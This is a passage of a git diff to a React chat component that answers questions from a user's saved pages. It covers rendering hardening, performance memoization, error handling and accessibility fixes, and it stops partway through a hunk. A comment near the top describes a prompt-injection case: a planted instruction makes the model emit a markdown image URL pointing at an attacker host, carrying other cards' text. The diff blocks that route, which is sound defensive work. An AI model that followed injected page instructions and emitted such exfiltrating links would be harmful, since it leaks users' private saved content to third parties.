@@ -1,16 +1,17 @@
 'use client';
 
-import { useState, useRef, useEffect, useMemo, useCallback } from 'react';
+import { useState, useRef, useEffect, useMemo, useCallback, memo } from 'react';
 import { ArrowUp, Plus, MessagesSquare, Copy, Check, TriangleAlert, RefreshCw, Square, RotateCcw, ArrowDown, X, ChevronLeft, Waypoints, Image as ImageIcon, StickyNote, Bookmark, BookmarkCheck, Share2 } from 'lucide-react';
 import type { OrbState } from '@/components/ui/CitationMark';
-import ReactMarkdown from 'react-markdown';
+import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remarkBreaks from 'remark-breaks';
 import { getDominantDirection } from '@/lib/rtl';
+import { isHttpUrl } from '@/lib/url';
 import { breakIntoParagraphs, normalizeListMarkers } from '@/lib/answerLayout';
 import SourceByline from '@/components/SourceByline';
 import { linkPlatform, platformIcon, platformColor, screenshotSource } from '@/lib/platform';
-import { appCheckHeaders } from '@/lib/firebase';
+import { appCheckHeaders, db } from '@/lib/firebase';
 import { authHeaders } from '@/lib/auth';
 import { apiUrl, isNativeApp, fetchWithTimeout } from '@/lib/api';
 import { track, trackFirstAsk, trackAskNoCitations, trackAskSuggestionUsed, trackAskFollowupUsed, trackAskStopped } from '@/lib/analytics';
@@ -20,6 +21,9 @@ import { ChatMessage, ChatSource, ChatSession, Link } from '@/lib/types';
 import { buildAskSuggestions, buildFollowUps, newestReadyLink, iso, fullTitle, AskHints, ClassifiableCard } from '@/lib/askSuggestions';
 import { subscribeChats, createChat, updateChat, deleteChat } from '@/lib/chats';
 import { answerRefFor, saveAnswerAsCard } from '@/lib/answerCards';
+import { unpublishAnswer } from '@/lib/answerShare';
+import { copyToClipboard } from '@/lib/share';
+import { doc, getDoc } from 'firebase/firestore';
 import { hapticLight } from '@/lib/haptics';
 import { useToast } from '@/components/Toast';
 import ShareAnswerSheet from './ShareAnswerSheet';
@@ -48,9 +52,63 @@ function meaningfulName(name?: string | null): string | null {
 // to live here (platform label + boxed brand logo) was the last copy of that
 // logic outside SourceByline, and it drifted, which is what this replaced.
 
-/** Renders an assistant answer as Markdown, styled to match the chat. GFM gives
- *  us tables/strikethrough; remark-breaks turns single newlines into <br> so the
- *  model's line breaks survive (like the old whitespace-pre-wrap).
+/** Hoisted so a render never hands ReactMarkdown a fresh array. GFM gives us
+ *  tables/strikethrough; remark-breaks turns single newlines into <br> so the
+ *  model's line breaks survive (like the old whitespace-pre-wrap). */
+const ANSWER_REMARK_PLUGINS = [remarkGfm, remarkBreaks];
+
+/** An answer never renders an image. Answers are written from saved pages, so
+ *  an instruction planted in one can make the model emit
+ *  `![](https://attacker/?d=<other cards' text>)`, and a rendered <img> would
+ *  send that URL the moment the answer appears, with no click (the CSP allows
+ *  any https image). Dropped outright, not unwrapped: an image's alt text is
+ *  the same attacker's text. Raw HTML is skipped for the same reason. */
+const ANSWER_DISALLOWED = ['img'];
+
+/** One component map per direction, built once at module load rather than per
+ *  render. Every heading level maps to ONE modest size: a model's # choice must
+ *  never shout inside a chat bubble. Headings and code are sized relative to
+ *  the answer (1em, and the 13:15 ratio), so they keep their proportion when
+ *  the answer scales with the reader's text size (see ANSWER_TEXT_CLS). */
+function answerComponents(dir: 'rtl' | 'ltr'): Components {
+    return {
+        // Mini-subheadings the structure prompt asks for on long answers.
+        h1: ({ children }) => <h4 dir={dir} className="text-[1em] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        h2: ({ children }) => <h4 dir={dir} className="text-[1em] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        h3: ({ children }) => <h4 dir={dir} className="text-[1em] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        h4: ({ children }) => <h4 dir={dir} className="text-[1em] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        p: ({ children }) => <p dir={dir} className="mb-2 last:mb-0">{children}</p>,
+        ul: ({ children }) => <ul dir={dir} className="list-disc ps-5 mb-2 last:mb-0 space-y-1">{children}</ul>,
+        ol: ({ children }) => <ol dir={dir} className="list-decimal ps-5 mb-2 last:mb-0 space-y-1">{children}</ol>,
+        li: ({ children }) => <li dir={dir} className="leading-relaxed">{children}</li>,
+        strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
+        // Only http(s) opens anything. The default URL transform already
+        // blanks javascript: and friends; this also keeps mailto:, relative
+        // and in-app paths from becoming tappable in the native shell, where
+        // a relative href would navigate the app itself.
+        a: ({ children, href }) => isHttpUrl(href) ? (
+            <a href={href} target="_blank" rel="noopener noreferrer" className="text-accent underline underline-offset-2 hover:text-accent-hover">
+                {children}
+            </a>
+        ) : <span>{children}</span>,
+        code: ({ children }) => <code className="px-1 py-0.5 rounded bg-card-hover text-[length:calc(13em/15)] font-mono">{children}</code>,
+    };
+}
+const ANSWER_COMPONENTS = { ltr: answerComponents('ltr'), rtl: answerComponents('rtl') };
+
+/** An answer is the longest text anyone reads in Ask, so it follows the
+ *  reader's system text size (iOS Dynamic Type) through the same
+ *  --reading-scale the card's `.reading-prose` uses (lib/useReadingScale).
+ *  Not that class itself: it pins 1rem (16px) and, being unlayered, would
+ *  override the answer's designed 15px. 15px at the default size. */
+const ANSWER_TEXT_CLS = 'text-[length:calc(15px*var(--reading-scale,1))]';
+
+/** Renders an assistant answer as Markdown, styled to match the chat.
+ *
+ *  Memoized on (content, dir): Ask re-renders on every keystroke and every
+ *  streamed token, and re-parsing every earlier answer each time cost 50-90ms
+ *  per render in a 15-30 answer chat. Only the answer that is still writing
+ *  re-parses now.
  *
  *  Direction: every block carries ONE direction for the whole message — NOT
  *  per-block `dir="auto"` (first-strong detection flipped any English bullet
@@ -62,42 +120,25 @@ function meaningfulName(name?: string | null): string | null {
  *  question answered in Hebrew must still render RTL). The QUESTION's
  *  direction (`dir` prop) is only the fallback for title-only/neutral
  *  content. */
-function MarkdownMessage({ content, dir: dirProp }: { content: string; dir?: 'rtl' | 'ltr' }) {
+const MarkdownMessage = memo(function MarkdownMessage({ content, dir: dirProp }: { content: string; dir?: 'rtl' | 'ltr' }) {
     const dir = getDominantDirection(content, dirProp ?? 'ltr');
+    // Two normalisations, both deterministic and text-preserving: stray list
+    // markers become real markdown, and a long answer the model returned as
+    // one unbroken block gets paragraph breaks (see lib/answerLayout — the
+    // prompt has asked for this since July and the model still doesn't
+    // always comply). Answers the model DID format pass through untouched.
+    const source = useMemo(() => breakIntoParagraphs(normalizeListMarkers(content)), [content]);
     return (
         <ReactMarkdown
-            remarkPlugins={[remarkGfm, remarkBreaks]}
-            components={{
-                // Mini-subheadings the structure prompt asks for on long
-                // answers. Every heading level maps to ONE modest size — a
-                // model's # choice must never shout inside a chat bubble.
-                h1: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                h2: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                h3: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                h4: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                p: ({ children }) => <p dir={dir} className="mb-2 last:mb-0">{children}</p>,
-                ul: ({ children }) => <ul dir={dir} className="list-disc ps-5 mb-2 last:mb-0 space-y-1">{children}</ul>,
-                ol: ({ children }) => <ol dir={dir} className="list-decimal ps-5 mb-2 last:mb-0 space-y-1">{children}</ol>,
-                li: ({ children }) => <li dir={dir} className="leading-relaxed">{children}</li>,
-                strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
-                a: ({ children, href }) => (
-                    <a href={href} target="_blank" rel="noopener noreferrer" className="text-accent underline underline-offset-2 hover:text-accent-hover">
-                        {children}
-                    </a>
-                ),
-                code: ({ children }) => <code className="px-1 py-0.5 rounded bg-card-hover text-[13px] font-mono">{children}</code>,
-            }}
+            remarkPlugins={ANSWER_REMARK_PLUGINS}
+            components={ANSWER_COMPONENTS[dir]}
+            disallowedElements={ANSWER_DISALLOWED}
+            skipHtml
         >
-            {/* Two normalisations, both deterministic and text-preserving:
-                stray list markers become real markdown, and a long answer the
-                model returned as one unbroken block gets paragraph breaks (see
-                lib/answerLayout — the prompt has asked for this since July and
-                the model still doesn't always comply). Answers the model DID
-                format pass through both untouched. */}
-            {breakIntoParagraphs(normalizeListMarkers(content))}
+            {source}
         </ReactMarkdown>
     );
-}
+});
 
 /** The shared look of every affordance under an answer: quiet, muted, and on
  *  desktop revealed by hovering the message (mobile has no hover, so they stay
@@ -109,19 +150,24 @@ const ANSWER_ACTION_CLS =
  *  When the answer has citations, the copied text carries them along as a
  *  "Sources:" list — a pasted answer keeps its proof. */
 function CopyButton({ text, sources }: { text: string; sources?: ChatSource[] }) {
+    const toast = useToast();
     const [copied, setCopied] = useState(false);
     const onCopy = async () => {
-        try {
-            let full = text;
-            if (sources && sources.length > 0) {
-                full += '\n\nSources:\n' + sources
-                    .map(s => (s.url ? `- ${s.title} - ${s.url}` : `- ${s.title}`))
-                    .join('\n');
-            }
-            await navigator.clipboard.writeText(full);
+        let full = text;
+        if (sources && sources.length > 0) {
+            full += '\n\nSources:\n' + sources
+                .map(s => (s.url ? `- ${s.title} - ${s.url}` : `- ${s.title}`))
+                .join('\n');
+        }
+        // copyToClipboard falls back to execCommand inside the WKWebView, where
+        // the async Clipboard API is often missing or rejects; a failure is
+        // said out loud instead of a silent no-op.
+        if (await copyToClipboard(full)) {
             setCopied(true);
             setTimeout(() => setCopied(false), 1500);
-        } catch { /* clipboard unavailable — silently no-op */ }
+        } else {
+            toast.error("Couldn't copy the answer.");
+        }
     };
     return (
         <button
@@ -170,6 +216,28 @@ function SaveAnswerButton({ saved, busy, onSave, onOpen }: {
  *  server clamps the total again (MAX_CONTEXT_IDS). */
 const RECENT_ANSWERS_FOR_CONTEXT = 2;
 
+/** Turns of history sent with a question: exactly what ask_brain reads
+ *  (MAX_HISTORY_ITEMS in functions/main.py). Keep the two in step. */
+const HISTORY_TURNS = 6;
+
+/** The longest question ask_brain accepts (MAX_QUESTION_LENGTH in
+ *  functions/main.py). The composer stops there instead of letting the server
+ *  refuse it, which used to fail the same way on every retry. */
+const MAX_QUESTION_CHARS = 2000;
+const QUESTION_TOO_LONG = 'That question is too long. Keep it under 2,000 characters and try again.';
+const GENERIC_ASK_ERROR = 'Something went wrong reaching Machina. Please try again.';
+
+/** What a failed ask says in the chat. The backend's user-facing errors are
+ *  whole sentences ("Too many requests. Please slow down.", the quota line);
+ *  its raw validation and server errors are bare fragments ("Internal server
+ *  error", "question is too long") that used to land in the bubble verbatim.
+ *  Fragments become plain copy here; callers still report the raw text. */
+function askErrorCopy(raw: string | undefined): string {
+    const msg = (raw ?? '').trim();
+    if (/question is too long/i.test(msg)) return QUESTION_TOO_LONG;
+    return /[.!?]$/.test(msg) ? msg : GENERIC_ASK_ERROR;
+}
+
 export type AskOrigin =
     | 'free'      // typed question → genuine library search
     | 'card'      // a chip about one specific card we suggested
@@ -215,19 +283,30 @@ const THINKING_STAGES: Record<AskOrigin, ThinkingStage[]> = {
     ],
 };
 
+/** The beat after the drafting one, for a wait that runs well past the usual
+ *  few seconds (a cold backend; the app's buffered answer, which shows nothing
+ *  until the whole reply exists). Without it, "Writing your answer…" sat
+ *  unchanged for up to a minute and read as a hang. Same for every origin. */
+const SLOW_STAGE: ThinkingStage = { phrase: 'Taking longer than usual…', orb: 'shaping' };
+const SLOW_AFTER_MS = 20_000;
+
 /** Staged "what Machina is doing" status shown while waiting for the answer —
  *  honest theater (mirrors the real pipeline) that makes the wait legible
  *  instead of three anonymous dots. Remounts per ask. `OrbStatus` owns the
- *  swap, so the orb and the phrase change as one gesture. */
-function ThinkingIndicator({ origin }: { origin: AskOrigin }) {
-    const stages = THINKING_STAGES[origin];
+ *  swap, so the orb and the phrase change as one gesture. Each phrase is also
+ *  handed to `onPhrase` for Ask's screen-reader status line. */
+function ThinkingIndicator({ origin, onPhrase }: { origin: AskOrigin; onPhrase?: (phrase: string) => void }) {
+    const stages = [...THINKING_STAGES[origin], SLOW_STAGE];
     const [stage, setStage] = useState(0);
+    const phrase = stages[stage].phrase;
 
     useEffect(() => {
         const t1 = setTimeout(() => setStage(1), 1600);
         const t2 = setTimeout(() => setStage(2), 4200);
-        return () => { clearTimeout(t1); clearTimeout(t2); };
+        const t3 = setTimeout(() => setStage(3), SLOW_AFTER_MS);
+        return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
     }, []);
+    useEffect(() => { onPhrase?.(phrase); }, [phrase, onPhrase]);
 
     return (
         <div className="flex justify-start">
@@ -257,7 +336,7 @@ function ThinkingIndicator({ origin }: { origin: AskOrigin }) {
                     the same split put a porcelain mark against a grey label. */}
                 <OrbStatus
                     orb="clamp"
-                    label={stages[stage].phrase}
+                    label={phrase}
                     stageKey={stage}
                     size={26}
                     entry="trace"
@@ -329,6 +408,10 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
     // True while an SSE answer is still writing (isThinking covers only the
     // pre-first-token wait). Together they gate the Stop affordance.
     const [isStreaming, setIsStreaming] = useState(false);
+    const busy = isThinking || isStreaming;
+    // What the screen-reader status line says: the thinking phrase while
+    // waiting, then "Answer ready" or the error. Never the streaming text.
+    const [liveStatus, setLiveStatus] = useState('');
     const scrollRef = useRef<HTMLDivElement>(null);
     const textareaRef = useRef<HTMLTextAreaElement>(null);
 
@@ -366,6 +449,13 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
     // Gate persistence until the initial load/migration has run, so the first
     // (empty) render doesn't create a stray chat.
     const hydratedRef = useRef(false);
+    // Question saves asked for BEFORE that: an ask handed over from the graph,
+    // a collection or a dead-end search is sent from the mount effect, ahead of
+    // the first chats snapshot. Skipping its save (the old behaviour) meant
+    // leaving early lost the question and its already-charged answer, which had
+    // no doc to land in. They run when the chats load, or on unmount if the
+    // user leaves first.
+    const pendingSavesRef = useRef<(() => void)[]>([]);
 
     // Stream lifecycle guard. Every send() captures the current generation; the
     // reader loop re-checks it before each setMessages, so a stale stream can't
@@ -402,8 +492,17 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
     // mid-stream that must DETACH, not drop: the in-flight answer keeps running
     // and persists to its chat doc via commitDetached, exactly like switching
     // chats. Without this, the streamed answer was silently discarded and the
-    // chat reopened as an unanswered question.
-    useEffect(() => () => { detachStreamRef.current(); }, []);
+    // chat reopened as an unanswered question. A question whose save was still
+    // waiting for the chats to load is saved now, so that answer has a doc.
+    useEffect(() => {
+        const pending = pendingSavesRef;
+        return () => {
+            detachStreamRef.current();
+            const queued = pending.current;
+            pending.current = [];
+            queued.forEach((save) => save());
+        };
+    }, []);
 
     // Living suggested prompts, built from the actual library (newest save,
     // this week's activity, shared concepts, top categories, a dusty card) and
@@ -595,6 +694,10 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
     useEffect(() => {
         if (!uid || !chatsLoaded || hydratedRef.current) return;
         hydratedRef.current = true;
+        // Questions asked before this point (see pendingSavesRef) save now.
+        const queued = pendingSavesRef.current;
+        pendingSavesRef.current = [];
+        queued.forEach((save) => save());
         const legacyKey = `askbrain:chat:${uid}`;
         let legacy: ChatMessage[] | null = null;
         try {
@@ -640,15 +743,17 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
         return task;
     }, [uid]);
 
-    // Debounced auto-save as the conversation grows.
+    // Debounced auto-save as the conversation grows, and once more when the
+    // chats first load: an answer that landed before they did would otherwise
+    // wait for the next message to be saved.
     useEffect(() => {
-        if (!uid || !hydratedRef.current || messages.length === 0) return;
+        if (!uid || !chatsLoaded || !hydratedRef.current || messages.length === 0) return;
         if (saveTimer.current) clearTimeout(saveTimer.current);
         const snapshot = messages;
         const convo = convoRef.current;
         saveTimer.current = setTimeout(() => persistConversation(snapshot, convo), 600);
         return () => { if (saveTimer.current) clearTimeout(saveTimer.current); };
-    }, [messages, uid, persistConversation]);
+    }, [messages, uid, chatsLoaded, persistConversation]);
 
     // ── Keeping and sharing an answer ─────────────────────────────────────────
     // An answer used to be the one thing you could not keep: copy the text or
@@ -704,6 +809,21 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
         } finally {
             setSavingIdx(null);
         }
+    };
+
+    /** "Saved" opens the card it made, unless that card has since been
+     *  deleted: then "Saved" opened "no longer in your library" and the answer
+     *  could never be kept again. A card outside the loaded window is looked
+     *  up before deciding; if the lookup fails it opens as before. */
+    const openSavedAnswer = async (idx: number, cardId: string) => {
+        if (!uid || links.some((l) => l.id === cardId)) { onOpenLink(cardId); return; }
+        let gone = false;
+        try {
+            gone = !(await getDoc(doc(db, 'users', uid, 'links', cardId))).exists();
+        } catch { /* can't tell: open it as before */ }
+        if (!gone) { onOpenLink(cardId); return; }
+        patchMessageAt(idx, { savedCardId: undefined });
+        toast.info('That card was deleted. Tap Save to keep this answer again.');
     };
 
     // ── Conversation actions ──────────────────────────────────────────────────
@@ -779,9 +899,31 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
             .catch((e) => reportError(e, 'ask-rename-chat'));
     };
 
+    /** Public answer pages a chat has published (messages[].shareId). The
+     *  chat doc is the ONLY record of those ids. */
+    const sharedPagesOf = (id: string): string[] => {
+        const msgs = id === activeChatId ? messages : chats.find((c) => c.id === id)?.messages ?? [];
+        return msgs.map((m) => m.shareId).filter((s): s is string => !!s);
+    };
+
     const confirmDeleteChat = () => {
         if (!uid || !chatToDelete) return;
         const id = chatToDelete;
+        // Take the chat's public answer pages down with it: once the doc is
+        // gone nothing remembers their ids, so they could never be stopped.
+        // Best effort, in parallel with the delete (which never waits on it);
+        // a page that would not come down is said out loud.
+        const shareIds = sharedPagesOf(id);
+        if (shareIds.length) {
+            void Promise.allSettled(shareIds.map((s) => unpublishAnswer(uid, s))).then((results) => {
+                const failed = results.filter((r) => r.status === 'rejected');
+                if (!failed.length) return;
+                reportError((failed[0] as PromiseRejectedResult).reason, 'ask-delete-chat-unpublish');
+                toast.error(failed.length === 1
+                    ? "Chat deleted, but its shared answer page couldn't be taken down."
+                    : `Chat deleted, but ${failed.length} of its shared answer pages couldn't be taken down.`);
+            });
+        }
         // Orphan any backgrounded answer still headed for this doc.
         chatOwnerGenRef.current.delete(id);
         deleteChat(uid, id).catch((e) => reportError(e, 'ask-delete-chat'));
@@ -878,7 +1020,11 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
         generatedOverride?: boolean,
     ) => {
         const question = text.trim();
-        if (!question || isThinking || !uid) return;
+        // Busy covers the WHOLE answer, not just the wait for its first token:
+        // checking isThinking alone let Enter mid-stream cancel the answer and
+        // send again, saving the cut-off half as if it were complete. Stop is
+        // the way to end an answer early.
+        if (!question || busy || !uid) return;
         setAskOrigin(origin);
 
         // Start a fresh stream generation — aborts any prior in-flight stream and
@@ -896,9 +1042,13 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
         // them apart (retry passes the original message's flag through).
         const generated = generatedOverride ?? origin !== 'free';
 
-        // History = the conversation so far (before this turn), trimmed server-side.
+        // History = the turns before this one, cut to what the server reads.
+        // ask_brain keeps only the last MAX_HISTORY_ITEMS turns
+        // (functions/main.py _sanitize_history); sending the whole conversation
+        // every turn grew the body until a long chat hit the route's 256KB cap
+        // and failed on every ask from then on ("Body too large").
         const baseMsgs = base ?? messages;
-        const history = baseMsgs.map(m => ({
+        const history = baseMsgs.slice(-HISTORY_TURNS).map(m => ({
             role: m.role,
             content: m.content,
             ...(m.generated ? { generated: true } : {}),
@@ -936,10 +1086,15 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
         // stream's commit could still pass the ownership check and overwrite
         // the screen, erasing this just-sent question.
         if (convo.id) chatOwnerGenRef.current.set(convo.id, gen);
-        const chatIdReady: Promise<string | null> = hydratedRef.current
-            ? persistConversation(withUser, convo)
-            : Promise.resolve(null);
-        chatIdReady.then(id => { if (id) chatOwnerGenRef.current.set(id, gen); });
+        const saveQuestion = () => {
+            // Ownership hangs off the persist task itself, so it is recorded
+            // before anything chained after it (a backgrounded completion) runs.
+            persistConversation(withUser, convo).then(id => { if (id) chatOwnerGenRef.current.set(id, gen); });
+        };
+        // Before the first chats snapshot (an ask handed over at mount), the
+        // save waits for it instead of being skipped (see pendingSavesRef).
+        if (hydratedRef.current) saveQuestion();
+        else pendingSavesRef.current.push(saveQuestion);
 
         // Mirror of the on-screen assistant bubble, so a detached stream can
         // persist the finished exchange even though it can't touch React state.
@@ -999,8 +1154,12 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
         const wantStream = !isNativeApp();
 
         try {
-            // 30s bounds connection setup only; for the streaming path fetch()
-            // resolves on headers, so a long token stream is not cut off.
+            // For the stream, fetch() resolves on the headers, so 30s bounds
+            // connection setup only and a long token stream is not cut off. The
+            // buffered (app) answer has no headers until the WHOLE reply exists,
+            // so its wait gets the server's full budget (Hosting allows 60s)
+            // plus slack: at 30s the app said "Couldn't reach Machina" while
+            // the server finished the answer and charged the ask.
             const res = await fetchWithTimeout(apiUrl('/api/chat'), {
                 method: 'POST',
                 headers: {
@@ -1016,9 +1175,11 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                     ...(contextIds.length ? { contextIds } : {}),
                 }),
                 signal: controller.signal,
-            }, 30_000);
+            }, wantStream ? 30_000 : 65_000);
 
-            if (isCancelled()) return; // torn down while the request was in flight
+            // Torn down while the request was in flight: release the response
+            // instead of leaving its body unread on an open connection.
+            if (isCancelled()) { res.body?.cancel().catch(() => {}); return; }
 
             const contentType = res.headers.get('content-type') || '';
             if (contentType.includes('text/event-stream') && res.body) {
@@ -1052,6 +1213,12 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                     });
 
                 const reader = res.body.getReader();
+                // Stop or a newer send aborts `controller`, but fetchWithTimeout
+                // stops watching it once the headers land — so cancel the body
+                // here. A read parked waiting for the next token then ends at
+                // once instead of holding the connection (and the server's
+                // work) open until the next chunk happens to arrive.
+                controller.signal.addEventListener('abort', () => { reader.cancel().catch(() => {}); }, { once: true });
                 const decoder = new TextDecoder();
                 let buffer = '';
                 let firstToken = true;
@@ -1099,10 +1266,11 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                             if (!isStale()) patchAt({ ungrounded: true });
                             trackAskNoCitations();
                         } else if (evt.type === 'error') {
-                            accError = evt.error || 'Something went wrong reaching Machina. Please try again.';
+                            accError = askErrorCopy(evt.error);
                             if (!isStale()) {
                                 setIsThinking(false);
                                 patchAt({ content: accError, error: true });
+                                setLiveStatus(accError);
                             }
                             // Surface the failure in client_errors — the backend
                             // message is sanitized, so record what the user saw
@@ -1112,7 +1280,13 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                         } else if (evt.type === 'done') {
                             done = true;
                             trackFirstAsk();
-                            if (!isStale()) hapticLight();
+                            // The ask was metered: keep the free plan's "N of 20
+                            // left" line current, as the buffered path does.
+                            if (!isPro) void refreshEntitlement();
+                            if (!isStale()) {
+                                hapticLight();
+                                setLiveStatus('Answer ready');
+                            }
                         }
                     }
                 }
@@ -1141,6 +1315,7 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                 if (!isPro) void refreshEntitlement();
                 if (isStale()) { commitDetached([...withUser, answer]); return; }
                 setMessages(prev => [...prev, answer]);
+                setLiveStatus('Answer ready');
                 hapticLight();
                 // Buffered path (native): the whole answer just landed at once —
                 // show it from the top, question first.
@@ -1157,11 +1332,12 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                 void refreshEntitlement();
                 if (isStale()) { commitDetached([...withUser, wallAnswer]); return; }
                 setMessages(prev => [...prev, wallAnswer]);
+                setLiveStatus(wallAnswer.content);
                 openPaywall('asks');
             } else {
                 const errAnswer: ChatMessage = {
                     role: 'assistant',
-                    content: data.error || 'Something went wrong reaching Machina. Please try again.',
+                    content: askErrorCopy(data.error),
                     error: true,
                 };
                 // Record what failed (status + sanitized backend message) so
@@ -1169,6 +1345,7 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                 reportError(new Error(`ask failed (HTTP ${res.status}): ${data.error || 'unknown'}`), 'ask-send');
                 if (isStale()) { commitDetached([...withUser, errAnswer]); return; }
                 setMessages(prev => [...prev, errAnswer]);
+                setLiveStatus(errAnswer.content);
             }
         } catch (e) {
             // A deliberate abort (Stop / a newer send) is not a user-facing error.
@@ -1188,6 +1365,7 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                 return;
             }
             setMessages(prev => [...prev, errAnswer]);
+            setLiveStatus(errAnswer.content);
         } finally {
             // Only the current generation owns these — a superseded run must not
             // clear the newer stream's thinking state or abort controller.
@@ -1210,8 +1388,6 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
             send(input);
         }
     };
-
-    const busy = isThinking || isStreaming;
 
     // Stop an in-flight answer. Whatever already streamed in stays (the
     // debounced auto-save keeps it); the pre-token wait just cancels cleanly.
@@ -1295,7 +1471,9 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                     {!isEmpty && (
                         <button
                             onClick={newChat}
-                            className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-text-muted text-xs font-medium hover:text-text active:bg-card-hover transition-colors cursor-pointer"
+                            // The pill draws 24px tall; the ::after stretches the
+                            // tap target to 44pt without changing the look.
+                            className="relative after:absolute after:inset-x-0 after:-inset-y-2.5 inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-text-muted text-xs font-medium hover:text-text active:bg-card-hover transition-colors cursor-pointer"
                         >
                             <Plus className="w-3.5 h-3.5" />
                             New
@@ -1409,7 +1587,7 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                                                     // Errors keep a subtle container so they stand out.
                                                     ? 'px-4 py-3 rounded-2xl rounded-bl-md text-[15px] leading-relaxed bg-red-500/10 border border-red-500/20 text-text whitespace-pre-wrap'
                                                     // AI answer: plain text on the page (no bubble), like Gemini.
-                                                    : 'px-1 text-[15px] leading-relaxed text-text'
+                                                    : `px-1 ${ANSWER_TEXT_CLS} leading-relaxed text-text`
                                         }
                                     >
                                         {/* User and error bubbles stay plain text; assistant answers render Markdown. */}
@@ -1433,7 +1611,7 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                                                         saved={!!m.savedCardId}
                                                         busy={savingIdx === i}
                                                         onSave={() => void saveAnswer(i)}
-                                                        onOpen={() => m.savedCardId && onOpenLink(m.savedCardId)}
+                                                        onOpen={() => { if (m.savedCardId) void openSavedAnswer(i, m.savedCardId); }}
                                                     />
                                                     <button
                                                         onClick={() => { hapticLight(); setShareIdx(i); }}
@@ -1449,8 +1627,10 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                                         </div>
                                     )}
 
-                                    {/* One-tap retry for the most recent failed exchange. */}
-                                    {m.error && i === messages.length - 1 && !busy && (
+                                    {/* One-tap retry for the most recent failed exchange
+                                        (not for a too-long question: the same text
+                                        would only be refused again). */}
+                                    {m.error && i === messages.length - 1 && !busy && m.content !== QUESTION_TOO_LONG && (
                                         <button
                                             onClick={retryLast}
                                             className="mt-2 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-card border border-border-subtle text-text-secondary text-[13px] font-medium hover:border-accent/40 hover:text-text transition-colors cursor-pointer"
@@ -1578,7 +1758,7 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                             </div>
                         ))}
 
-                        {isThinking && <ThinkingIndicator origin={askOrigin} />}
+                        {isThinking && <ThinkingIndicator origin={askOrigin} onPhrase={setLiveStatus} />}
 
                         {/* Content-aware one-tap follow-ups once the latest answer has
                             settled (empty when the turn can't produce a tailored set). */}
@@ -1627,6 +1807,10 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                         <button
                             dir="auto"
                             onClick={() => {
+                                // send() refuses while an answer is still
+                                // coming; keep the offer up rather than
+                                // dismissing it with nothing sent.
+                                if (busy) return;
                                 trackAskSuggestionUsed('fresh');
                                 // Full title in the sent bubble (owner rule: no truncation).
                                 send(`What's the gist of "${iso(fullTitle(freshCard.title) ?? freshCard.title)}"?`, undefined, 'card',
@@ -1640,7 +1824,8 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                         <button
                             onClick={() => setFreshCard(null)}
                             aria-label="Dismiss"
-                            className="shrink-0 p-1.5 rounded-full text-text-muted hover:text-text transition-colors cursor-pointer"
+                            // 26px drawn, 44pt to the finger (the ::after).
+                            className="relative after:absolute after:-inset-[9px] shrink-0 p-1.5 rounded-full text-text-muted hover:text-text transition-colors cursor-pointer"
                         >
                             <X className="w-3.5 h-3.5" />
                         </button>
@@ -1670,6 +1855,8 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                         onKeyDown={handleKeyDown}
                         onFocus={handleFocus}
                         rows={1}
+                        maxLength={MAX_QUESTION_CHARS}
+                        aria-label="Ask Machina"
                         placeholder={uid ? 'Ask about anything you’ve saved…' : 'Loading your library…'}
                         disabled={!uid}
                         // Majority direction, not any-Hebrew-flips-RTL: typing an
@@ -1684,7 +1871,8 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                             onClick={stopGeneration}
                             aria-label="Stop generating"
                             variant="secondary"
-                            className="shrink-0"
